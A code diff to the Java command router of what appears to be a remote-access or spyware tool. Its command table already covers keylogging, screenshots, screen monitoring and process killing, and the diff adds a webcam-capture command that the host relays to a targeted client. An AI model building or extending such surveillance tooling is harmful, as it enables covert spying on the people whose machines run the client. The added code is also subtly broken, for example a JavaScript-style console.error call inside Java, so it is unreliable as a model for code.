@@ -22,6 +22,7 @@ public class Controller {
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_GET_HOST_PRIVILEGE, Controller::getHostPrivilege);
         put(COMMAND_CLIENT_MONITOR, Controller::getClientMonitor);
+        put(COMMAND_CLIENT_CAMERA, Controller::getClientCamera);
         put(COMMAND_CLIENT_SCREENSHOT, Controller::getClientScreenshot);
         put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
         put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
@@ -66,6 +67,24 @@ public class Controller {
                 client.onSend(oldJSON.put("isMonitoring", false).toString());
             });
             System.out.println("ISHOT "+json);
+            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), json.toString());
+            return;
+        }
+        System.out.println(json);
+        json.put(FORM, sender.getUUID());
+        Server.getHost().onSend(json.toString());
+    }
+
+    private static void getClientCamera(JSON json, SocketModel sender) {
+        console.error(json.get(TO));
+        System.out.println("BF" + json.get(TO));
+        if (isHost(sender.getUUID())) {
+            JSON oldJSON = new JSON(json.toString());
+            Server.getClientConnections().values().forEach(client -> {
+
+                client.onSend(oldJSON.put("isUseCamera", false).toString());
+            });
+            System.out.println("ISHOT " + json);
             onHostSend(sender, Server.getClientConnections().get(json.get(TO)), json.toString());
             return;
         }
